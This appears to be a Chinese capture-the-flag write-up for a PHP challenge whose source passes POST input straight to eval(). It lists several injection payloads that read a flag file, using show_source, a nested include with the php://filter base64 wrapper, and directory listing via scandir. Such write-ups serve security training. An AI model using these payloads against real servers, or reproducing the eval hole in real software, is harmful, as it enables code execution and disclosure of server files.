```
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}

```

同上



### 第一种

```
c=show_source("flag.php");
```

![image-20250404153048202](./assets/image-20250404153048202.png)

```
c=highlight_file("flag.php");
```

![image-20250404153102570](./assets/image-20250404153102570.png)





### 第二种

嵌套include

```
c=include$_POST[a]?>&a=php://filter/convert.base64-encode/resource=flag.php
```

![image-20250404153120489](./assets/image-20250404153120489.png)

![image-20250404153135885](./assets/image-20250404153135885.png)





### 第三种

```
c=var_dump(scandir(getcwd()));
```

![image-20250404153201297](./assets/image-20250404153201297.png)

```
c=show_source(next(array_reverse(scandir(getcwd()))));
```

![image-20250404153206650](./assets/image-20250404153206650.png)